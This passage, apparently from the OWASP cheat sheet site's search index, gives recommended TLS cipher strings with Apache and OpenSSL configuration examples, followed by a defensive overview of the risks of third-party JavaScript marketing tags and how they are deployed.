TLS_AES_256_GCM_SHA384 ] 0x1302 1 1 1 1 TLS_CHACHA20_POLY1305_SHA256 (TLSv1.3) , [ TLS_CHACHA20_POLY1305_SHA256 ] 0x1303 2 2 2 2 TLS_AES_128_GCM_SHA256 (TLSv1.3) , [ TLS_AES_128_GCM_SHA256 ] 0x1301 3 3 3 3 TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 , [ DHE-RSA-AES256-GCM-SHA384 ] 0x009f 4 4 4 4 TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 , [ DHE-RSA-AES128-GCM-SHA256 ] 0x009e 5 5 5 5 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 , [ ECDHE-RSA-AES256-GCM-SHA384 ] 0xc030 6 6 6 6 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 , [ ECDHE-RSA-AES128-GCM-SHA256 ] 0xc02f 7 7 7 7 TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 , [ DHE-RSA-AES256-SHA256 ] 0x006b 8 8 8 TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 , [ DHE-RSA-AES128-SHA256 ] 0x0067 9 9 9 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 , [ ECDHE-RSA-AES256-SHA384 ] 0xc028 10 10 10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 , [ ECDHE-RSA-AES128-SHA256 ] 0xc027 11 11 11 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA , [ ECDHE-RSA-AES256-SHA ] 0xc014 12 12 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA , [ ECDHE-RSA-AES128-SHA ] 0xc013 13 13 TLS_RSA_WITH_AES_256_GCM_SHA384 , [ AES256-GCM-SHA384 ] 0x009d 14 TLS_RSA_WITH_AES_128_GCM_SHA256 , [ AES128-GCM-SHA256 ] 0x009c 15 TLS_RSA_WITH_AES_256_CBC_SHA256 , [ AES256-SHA256 ] 0x003d 16 TLS_RSA_WITH_AES_128_CBC_SHA256 , [ AES128-SHA256 ] 0x003c 17 TLS_RSA_WITH_AES_256_CBC_SHA , [ AES256-SHA ] 0x0035 18 TLS_RSA_WITH_AES_128_CBC_SHA , [ AES128-SHA ] 0x002f 19 TLS_DHE_RSA_WITH_AES_256_CBC_SHA , [ DHE-RSA-AES256-SHA ] 0x0039 14 20 TLS_DHE_RSA_WITH_AES_128_CBC_SHA , [ DHE-RSA-AES128-SHA ] 0x0033 15 21 Remarks: Elder versions of Internet-Explorer and Java do NOT support Diffie-Hellman parameters superior to 1024 bit. So the ciphers TLS_DHE_RSA_WITH_AES_256_CBC_SHA and TLS_DHE_RSA_WITH_AES_128_CBC_SHA were moved to the end to prevent possible incompatibility issues. Other option: Delete this two ciphers from your list . Examples for cipher strings \u00b6 OpenSSL \u00b6 Cipher-String OpenSSL syntax Advanced (A) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256 Broad Compatibility (B) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256 Widest Compatibility (C) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA Legacy (D) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA How to use this Cipher Strings \u00b6 Inform yourself how to securely configure the settings for the services or hardware that you do use, e.g. BetterCrypto.org: Applied Crypto Hardening (DRAFT) , Mozilla: Security/Server Side TLS . We recommend to use one of the cipher strings described above. Example configs \u00b6 Apache \u00b6 Cipher String 'B': SSLProtocol +TLSv1.2 # for Cipher-String 'A', 'B' ##SSLProtocol +TLSv1.2 +TLSv1.1 +TLSv1 # for Cipher-String 'C', 'D' SSLCompression off SSLHonorCipherOrder on SSLCipherSuite 'DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256' ##add optionally ':!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!DSS:!RC4:!SEED:!ECDSA:!ADH:!IDEA:!3DES' Remarks: The cipher string is compiled as a whitelist of individual ciphers to get a better compatibility even with old versions of OpenSSL. Monitor the performance of your server, e.g. the TLS handshake with DHE hinders the CPU about 2.4 times more than ECDHE, cf. Vincent Bernat, 2011 , nmav's Blog, 2011 . Verify your cipher string using your crypto library, e.g. openssl using cipher string 'B': openssl ciphers -V \"DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256\" ##add optionally ':!aNULL:!eNULL:!LOW:!MD5:!EXP:!PSK:!DSS:!RC4:!SEED:!ECDSA:!ADH:!IDEA' to protect ##older Versions of OpenSSL ##use openssl ciphers -v \"...\" for openssl < 1.0.1: 0x00,0x9F - DHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=DH Au=RSA Enc=AESGCM(256) Mac=AEAD 0x00,0x9E - DHE-RSA-AES128-GCM-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AESGCM(128) Mac=AEAD 0xC0,0x30 - ECDHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH Au=RSA Enc=AESGCM(256) Mac=AEAD 0xC0,0x2F - ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 Kx=ECDH Au=RSA Enc=AESGCM(128) Mac=AEAD 0x00,0x6B - DHE-RSA-AES256-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AES(256) Mac=SHA256 0x00,0x67 - DHE-RSA-AES128-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AES(128) Mac=SHA256 0xC0,0x28 - ECDHE-RSA-AES256-SHA384 TLSv1.2 Kx=ECDH Au=RSA Enc=AES(256) Mac=SHA384 0xC0,0x27 - ECDHE-RSA-AES128-SHA256 TLSv1.2 Kx=ECDH Au=RSA Enc=AES(128) Mac=SHA256 CAUTION: You must not use legacy versions of OpenSSL if you use this cipher string! We strongly recommend to verify if it works! Related Articles \u00b6 OWASP: Transport Layer Protection Cheat Sheet . BetterCrypto.org: Applied Crypto Hardening (DRAFT) . Mozilla: Security/Server Side TLS .","title":"TLS Cipher String"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#tls-cipher-string-cheat-sheet","text":"","title":"TLS Cipher String Cheat Sheet"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear and simple examples for the cipher string. They are based on different scenarios where you use the Transport Layer Security (TLS) protocol.","title":"Introduction"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#recommendations-for-a-cipher-string","text":"","title":"Recommendations for a cipher string"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#scenarios","text":"The cipher strings are based on the recommendation to setup your policy to get a whitelist for your ciphers as described in the Transport Layer Protection Cheat Sheet (Rule - Only Support Strong Cryptographic Ciphers) . The latest and strongest ciphers as well as additional improvements are solely available with TLSv1.3, older protocols don't support them. Please find enclosed all supported protocols by the scenario. Finally we have compiled the oldest versions of different client agents that are still compatible with a cipher string. We provide this information according to the ciphers and protocols supported by browsers, libraries, bots on the basis of ssllabs's list of user agent capabilities and tests on our own. We have checked this thoroughly, but please accept that all data is provided without any warranty of any kind. The list of the oldest supported clients assumes that the server supports all ciphers by the scenario (Please contact the authors if you find any errors or if you can provide additional data). The recommended cipher strings are based on different scenarios: OWASP Cipher String 'A' (Advanced, wide browser compatibility, e.g. to most newer browser versions): Recommended if you control the server and the clients. Make sure to check the compatibility before using it. Includes solely the strongest Perfect Forward Secrecy (PFS) and authenticated ciphers. Protocols: TLSv1.3 , TLSv1.2 (and newer or better). Oldest known clients that are compatible: Android 4.4.2, BingPreview Jan 2015, Chrome 32/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 27/Win 8, Googlebot Feb 2015, IE11/Win 7 + MS14-066, Java 8b132, OpenSSL 1.0.1e, Safari 9/iOS 9, Yahoo Slurp Jun 2014, YandexBot Sep 2014. OWASP Cipher String 'B' (Broad compatibility to browsers, check the compatibility to other protocols before using it, e.g. IMAPS): Recommended if you solely control the server, the clients use their browsers and if you check the compatibility before using it for other protocols than HTTPS. Includes solely the strongest and stronger PFS ciphers. Protocols: TLSv1.3 , TLSv1.2 (and newer or better). Oldest known clients that are compatible: Android 4.4.2, BingPreview Jan 2015, Chrome 30/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 27/Win 8, Googlebot Feb 2015, IE11/Win 7, IE 11/WinPhone 8.1, Java 8b132, OpenSSL 1.0.1e, Opera 17/Win 7, Safari 5/iOS 5.1.1, Safari 7/OS X 10.9, Yahoo Slurp Jun 2014, YandexBot Sep 2014 OWASP Cipher String 'C' (Widest Compatibility, compatibility to most legacy browsers, legacy libraries (still patched) and other application protocols besides https, e.g. IMAPS): You may use this if you solely control the server, your clients use elder browsers and other elder libraries or if you use other protocols than HTTPS. Includes solely PFS ciphers. Be aware of additional risks and of new vulnerabilities that may appear are more likely than above. Plan to phase out SHA-1 and TLSv1, TLSv1.1 for HTTPS in middle-term. Protocols: TLSv1.3 , TLSv1.2 , TLSv1.1 , TLSv1 (and newer or better). Oldest known clients that are compatible: Android 2.3.7/4.0.4, Baidu Jan 2015, BingPreview Dec 2013, Chrome 27/Win 7, Chrome 34/OS X, Edge 12/Win 10, Firefox 10.0.12 ESR/Win 7, Firefox 21/Win 7+Fedora 19, Googlebot Oct 2013, IE 7/Vista, IE 10/WinPhone 8.0, Java 7u25, OpenSSL 0.9.8y, Opera 12.15/Win 7, Safari 5/iOS 5.1.1, Safari 5.1.9/macOS 10.6.8, Yahoo Slurp Oct 2013, YandexBot May 2014 OWASP Cipher String 'D' (Legacy, widest compatibility to real old browsers and legacy libraries and other application protocols like SMTP): Take care, use this cipher string only if you are forced to support non PFS for real old clients with very old libraries or for other protocols besides HTTPS. Be aware of the existing risks (e.g. ciphers without PFS, ciphers with 3DES) and of new vulnerabilities that may appear the most likely. Do not use WEAK ciphers based on 3DES e.g. ( TLS_RSA_WITH_3DES_EDE_CBC_SHA , DES-CBC3-SHA ) Never use even more INSECURE or elder ciphers based on RC2 , RC4 , DES , MD4 , MD5 , EXP , EXP1024 , AH , ADH , aNULL , eNULL , SEED nor IDEA . PFS ciphers are preferred, except all DHE ciphers that use SHA-1 (to prevent possible incompatibility issues caused by the length of the DHparameter ). Plan to move to 'A' for HTTPS or at least 'B' otherwise in middle-term. Protocols: TLSv1.3 , TLSv1.2 , TLSv1.1 , TLSv1 (and newer or better).","title":"Scenarios"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#table-of-the-ciphers-and-their-priority-from-high-1-to-low-eg-18","text":"IANA, OpenSSL and other crypto libraries use slightly different names for the same ciphers. This table lists the names used by IANA and by openssl in brackets [] . Additional you can find the unambiguously hex values defined by IANA. Mozilla offers a larger cipher names correspondence table . Cipher name: IANA, [OpenSSL] Cipher HEX value Advanced (A) Broad Compatibility (B) Widest Compatibility (C) Legacy (D) TLS_AES_256_GCM_SHA384 (TLSv1.3) , [ TLS_AES_256_GCM_SHA384 ] 0x1302 1 1 1 1 TLS_CHACHA20_POLY1305_SHA256 (TLSv1.3) , [ TLS_CHACHA20_POLY1305_SHA256 ] 0x1303 2 2 2 2 TLS_AES_128_GCM_SHA256 (TLSv1.3) , [ TLS_AES_128_GCM_SHA256 ] 0x1301 3 3 3 3 TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 , [ DHE-RSA-AES256-GCM-SHA384 ] 0x009f 4 4 4 4 TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 , [ DHE-RSA-AES128-GCM-SHA256 ] 0x009e 5 5 5 5 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 , [ ECDHE-RSA-AES256-GCM-SHA384 ] 0xc030 6 6 6 6 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 , [ ECDHE-RSA-AES128-GCM-SHA256 ] 0xc02f 7 7 7 7 TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 , [ DHE-RSA-AES256-SHA256 ] 0x006b 8 8 8 TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 , [ DHE-RSA-AES128-SHA256 ] 0x0067 9 9 9 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 , [ ECDHE-RSA-AES256-SHA384 ] 0xc028 10 10 10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 , [ ECDHE-RSA-AES128-SHA256 ] 0xc027 11 11 11 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA , [ ECDHE-RSA-AES256-SHA ] 0xc014 12 12 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA , [ ECDHE-RSA-AES128-SHA ] 0xc013 13 13 TLS_RSA_WITH_AES_256_GCM_SHA384 , [ AES256-GCM-SHA384 ] 0x009d 14 TLS_RSA_WITH_AES_128_GCM_SHA256 , [ AES128-GCM-SHA256 ] 0x009c 15 TLS_RSA_WITH_AES_256_CBC_SHA256 , [ AES256-SHA256 ] 0x003d 16 TLS_RSA_WITH_AES_128_CBC_SHA256 , [ AES128-SHA256 ] 0x003c 17 TLS_RSA_WITH_AES_256_CBC_SHA , [ AES256-SHA ] 0x0035 18 TLS_RSA_WITH_AES_128_CBC_SHA , [ AES128-SHA ] 0x002f 19 TLS_DHE_RSA_WITH_AES_256_CBC_SHA , [ DHE-RSA-AES256-SHA ] 0x0039 14 20 TLS_DHE_RSA_WITH_AES_128_CBC_SHA , [ DHE-RSA-AES128-SHA ] 0x0033 15 21 Remarks: Elder versions of Internet-Explorer and Java do NOT support Diffie-Hellman parameters superior to 1024 bit. So the ciphers TLS_DHE_RSA_WITH_AES_256_CBC_SHA and TLS_DHE_RSA_WITH_AES_128_CBC_SHA were moved to the end to prevent possible incompatibility issues. Other option: Delete this two ciphers from your list .","title":"Table of the ciphers (and their priority from high (1) to low (e.g. 18))"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#examples-for-cipher-strings","text":"","title":"Examples for cipher strings"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#openssl","text":"Cipher-String OpenSSL syntax Advanced (A) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256 Broad Compatibility (B) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256 Widest Compatibility (C) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA Legacy (D) TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA","title":"OpenSSL"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#how-to-use-this-cipher-strings","text":"Inform yourself how to securely configure the settings for the services or hardware that you do use, e.g. BetterCrypto.org: Applied Crypto Hardening (DRAFT) , Mozilla: Security/Server Side TLS . We recommend to use one of the cipher strings described above.","title":"How to use this Cipher Strings"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#example-configs","text":"","title":"Example configs"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#apache","text":"Cipher String 'B': SSLProtocol +TLSv1.2 # for Cipher-String 'A', 'B' ##SSLProtocol +TLSv1.2 +TLSv1.1 +TLSv1 # for Cipher-String 'C', 'D' SSLCompression off SSLHonorCipherOrder on SSLCipherSuite 'DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256' ##add optionally ':!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!DSS:!RC4:!SEED:!ECDSA:!ADH:!IDEA:!3DES' Remarks: The cipher string is compiled as a whitelist of individual ciphers to get a better compatibility even with old versions of OpenSSL. Monitor the performance of your server, e.g. the TLS handshake with DHE hinders the CPU about 2.4 times more than ECDHE, cf. Vincent Bernat, 2011 , nmav's Blog, 2011 . Verify your cipher string using your crypto library, e.g. openssl using cipher string 'B': openssl ciphers -V \"DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256\" ##add optionally ':!aNULL:!eNULL:!LOW:!MD5:!EXP:!PSK:!DSS:!RC4:!SEED:!ECDSA:!ADH:!IDEA' to protect ##older Versions of OpenSSL ##use openssl ciphers -v \"...\" for openssl < 1.0.1: 0x00,0x9F - DHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=DH Au=RSA Enc=AESGCM(256) Mac=AEAD 0x00,0x9E - DHE-RSA-AES128-GCM-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AESGCM(128) Mac=AEAD 0xC0,0x30 - ECDHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH Au=RSA Enc=AESGCM(256) Mac=AEAD 0xC0,0x2F - ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 Kx=ECDH Au=RSA Enc=AESGCM(128) Mac=AEAD 0x00,0x6B - DHE-RSA-AES256-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AES(256) Mac=SHA256 0x00,0x67 - DHE-RSA-AES128-SHA256 TLSv1.2 Kx=DH Au=RSA Enc=AES(128) Mac=SHA256 0xC0,0x28 - ECDHE-RSA-AES256-SHA384 TLSv1.2 Kx=ECDH Au=RSA Enc=AES(256) Mac=SHA384 0xC0,0x27 - ECDHE-RSA-AES128-SHA256 TLSv1.2 Kx=ECDH Au=RSA Enc=AES(128) Mac=SHA256 CAUTION: You must not use legacy versions of OpenSSL if you use this cipher string! We strongly recommend to verify if it works!","title":"Apache"},{"location":"cheatsheets/TLS_Cipher_String_Cheat_Sheet.html#related-articles","text":"OWASP: Transport Layer Protection Cheat Sheet . BetterCrypto.org: Applied Crypto Hardening (DRAFT) . Mozilla: Security/Server Side TLS .","title":"Related Articles"},{"location":"cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html","text":"Third Party JavaScript Management Cheat Sheet \u00b6 Introduction \u00b6 Tags, aka marketing tags, analytics tags etc. are small bits of JavaScript on a web page. They can also be HTML image elements when JavaScript is disabled. The reason for them is to collect data on the web user actions and browsing context for use by the web page owner in marketing. Third party vendor JavaScript tags (hereinafter, tags ) can be divided into two types: User interface tags. Analytic tags. User interface tags have to execute on the client because they change the DOM; displaying a dialog or image or changing text etc. Analytics tags send information back to a marketing information database; information like what user action was just taken, browser metadata, location information, page metadata etc. The rationale for analytics tags is to provide data from the user's browser DOM to the vendor for some form of marketing analysis. This data can be anything available in the DOM. The data is used for user navigation and clickstream analysis, identification of the user to determine further content to display etc., and various marketing analysis functions. The term host refers to the original site the user goes to, such as a shopping or news site, that contains or retrieves and executes third party JavaScript tag for marketing analysis of the user actions. Major risks \u00b6 The single greatest risk is a compromise of the third party JavaScript server, and the injection of malicious JavaScript into the original tag JavaScript. This has happened in 2018 and likely earlier. The invocation of third-party JS code in a web application requires consideration for 3 risks in particular: The loss of control over changes to the client application, The execution of arbitrary code on client systems, The disclosure or leakage of sensitive information to 3rd parties. Risk 1: Loss of control over changes to the client application \u00b6 This risk arises from the fact that there is usually no guaranty that the code hosted at the third-party will remain the same as seen from the developers and testers: new features may be pushed in the third-party code at any time, thus potentially breaking the interface or data-flows and exposing the availability of your application to its users/customers. Typical defenses include, but are not restricted to: in-house script mirroring (to prevent alterations by 3rd parties), sub-resource integrity (to enable browser-level interception) and secure transmission of the third-party code (to prevent modifications while in-transit). See below for more details. Risk 2: Execution of arbitrary code on client systems \u00b6 This risk arises from the fact that third-party JavaScript code is rarely reviewed by the invoking party prior to its integration into a website/application. As the client reaches the hosting website/application, this third-party code gets executed, thus granting the third-party the exact same privileges that were granted to the user (similar to XSS attacks ). Any testing performed prior to entering production loses some of its validity, including AST testing ( IAST , RAST , SAST , DAST , etc.). While it is widely accepted that the probability of having rogue code intentionally injected by the third-party is low, there are still cases of malicious injections in third-party code after the organization's servers were compromised (ex: Yahoo, January 2014). This risk should therefore still be evaluated, in particular when the third-party does not show any documentation that it is enforcing better security measures than the invoking organization itself, or at least equivalent. Another example is that the domain hosting the third-party JavaScript code expires because the company maintaining it is bankrupt or the developers have abandoned the project. A malicious actor can then re-register the domain and publish malicious code. Typical defenses include, but are not restricted to: In-house script mirroring (to prevent alterations by 3rd parties), Sub-resource integrity (to enable browser-level interception), Secure transmission of the third-party code (to prevent modifications while in-transit) and various types of sandboxing. See below for more details. ... Risk 3: Disclosure of sensitive information to 3rd parties \u00b6 When a third-party script is invoked in a website/application, the browser directly contacts the third-party servers. By default, the request includes all regular HTTP headers. In addition to the originating IP address of the browser, the third-party also obtains other data such as the referrer (in non-https requests) and any cookies previously set by the 3rd party, for example when visiting another organization's website that also invokes the third-party script. In many cases, this grants the third-party primary access to information on the organization's users / customers / clients. Additionally, if the third-party is sharing the script with other entities, it also collects secondary data from all the other entities, thus knowing who the organization's visitors are but also what other organizations they interact with. A typical case is the current situation with major news/press sites that invoke third-party code (typically for ad engines, statistics and JavaScript APIs): any user visiting any of these websites also informs the 3rd parties of the visit. In many cases, the third-party also gets to know what news articles each individual user is clicking specifically (leakage occurs through the HTTP referrer field) and thus can establish deeper personality profiles. Typical defenses include, but are not restricted to: in-house script mirroring (to prevent leakage of HTTP requests to 3rd parties). Users can reduce their profiling by random clicking links on leaking websites/applications (such as press/news websites) to reduce profiling. See below for more details. Third-party JavaScript Deployment Architectures \u00b6 There are three basic deployment mechanisms for tags . These mechanisms can be combined with each other. Vendor JavaScript on page \u00b6 This is where the vendor provides the host with the JavaScript and the host puts it on the host page. To be secure the host company must review the code for any vulnerabilities like XSS attacks or malicious actions such as sending sensitive data from the DOM to a malicious site. This is often difficult because the JavaScript is commonly obfuscated. <!-- Some host, e.g. foobar.com, HTML code here --> < html > < head ></ head > < body > ... < script type = \"text/javascript\" > /* 3rd party vendor javascript here */ </ script > </ body > </ html > JavaScript Request to Vendor \u00b6 This is where one or a few lines of code on the host page each request a JavaScript file or URL directly from the vendor site. When the host page is being created, the developer includes the lines of code provided by the vendor that will request the vendor JavaScript. Each time the page is accessed the requests are made to the vendor site for the javascript, which then executes on the user browser. <!-- Some host, e.g. foobar.com, HTML code here --> ` < html > < head ></ head > < body > ... <!-- 3rd party vendor javascript --> < script src = \"https://analytics.vendor.com/v1.1/script.js\" ></ script > <!-- /3rd party vendor javascript --> </ body > </ html > Indirect request to Vendor through Tag Manager \u00b6 This is where one or a few lines of code on the host page each request a JavaScript file or URL from a tag aggregator or tag manager site; not from the JavaScript vendor site. The tag aggregator or tag manager site returns whatever third party JavaScript files that the host company has configured to be returned. Each file or URL request to the tag manager site can return lots of other JavaScript files from multiple vendors. The actual content that is returned from the aggregator or manager (i.e. the specific JavaScript files as well as exactly what they do) can be dynamically changed by host site employees using a graphical user interface for development, hosted on the tag manager site that non-technical users can work with, such as the marketing part of the business. The changes can be either: Get a different JavaScript file from the third-party vendor for the same request. Change what DOM object data is read, and when, to send to the vendor. The tag manager developer user interface will generate code that does what the marketing functionality requires, basically determining what data to get from the browser DOM and when to get it. The tag manager always returns a container JavaScript file to the browser which is basically a set of JavaScript functions that are used by the code generated by the user interface to implement the required functionality. Similar to java frameworks that provide functions and global data to the developer, the container JavaScript executes on the browser and lets the business user use the tag manager developer user interface to specify high level functionality without needing to know JavaScript. <!-- Some host, e.g. foobar.com, HTML code here --> < html > < head ></ head > < body > ... <!-- Tag Manager --> < script >( function ( w , d , s , l , i ){ w [ l ] = w [ l ] || []; w [ l ]. push ({ 'tm.start' : new Date (). getTime (), event : 'tm.js' }); var f = d . getElementsByTagName ( s )[ 0 ], j = d . createElement ( s ), dl = l != 'dataLayer' ? '&l=' + l : '' ; j . async = true ; j . src = 'https://tagmanager.com/tm.js?id=' + i + dl ; f . parentNode . insertBefore ( j , f ); })( window , document , 'script' , 'dataLayer' , 'TM-FOOBARID' );</ script > <!-- /Tag Manager --> </ body > </ html > ` Security Problems with requesting Tags \u00b6 The previously described mechanisms are difficult to make secure because you can only see the code if you proxy the requests or if you get access to the GUI and see what is configured. The JavaScript is generally obfuscated so even seeing it is usually not useful. It is also instantly deployable because each new page request from a browser executes the requests to the aggregator which gets the JavaScript from the third party vendor. So as soon as any JavaScript files are changed on the vendor, or modified on the aggregator, the next call for them from any browser will get the changed JavaScript. One way to manage this risk is with the Subresource Integrity standard described below. Server Direct Data Layer \u00b6 The tag manager developer user interface can be used to create JavaScript that can get data from anywhere in the browser DOM and store it anywhere on the page. This can allow vulnerabilities because the interface can be used to generate code to get unvalidated data from the DOM (e.g. URL parameters) and store it in some page location that would execute JavaScript. The best way to make the generated code secure is to confine it to getting DOM data from a host defined data layer. The data layer is either: a DIV object with attribute values that have the marketing or user behavior data that the third-party wants a set of JSON objects with the same data. Each variable or attribute contains the value of some DOM element or the description of a user action. The data layer is the complete set of values that all vendors need for that page. The data layer is created by the host developers. When specific events happen that the business has defined, a JavaScript handler for that event sends values from the data layer directly to the tag manager server. The tag manager server then sends the data to whatever third party or parties is supposed to get it. The event handler code is created by the host developers using the tag manager developer user interface. The event handler code is loaded from the tag manager servers on every page load. This is a secure technique because only your JavaScript executes on your users browser, and only the data you decide on is sent to the vendor. This requires cooperation between the host, the aggregator or tag manager and the vendors. The host developers have to work with the vendor in order to know what type of data the vendor needs to do their analysis. Then the host programmer determines what DOM element will have that data. The host developers have to work with the tag manager or aggregator to agree on the protocol to send the data to the aggregator: what URL, parameters, format etc. The tag manager or aggregator has to work with the vendor to agree on the protocol to send the data to the vendor: what URL, parameters, format etc. Does the vendor have an API? Security Defense Considerations \u00b6 Server Direct Data Layer \u00b6 The server direct mechanism is a good security standard for third party JavaScript management, deployment and execution. A good practice for the host page is to create a data layer of DOM objects. The data layer can perform any validation of the values, especially values from DOM objects exposed to the user like URL parameters and input fields, if these are required for the 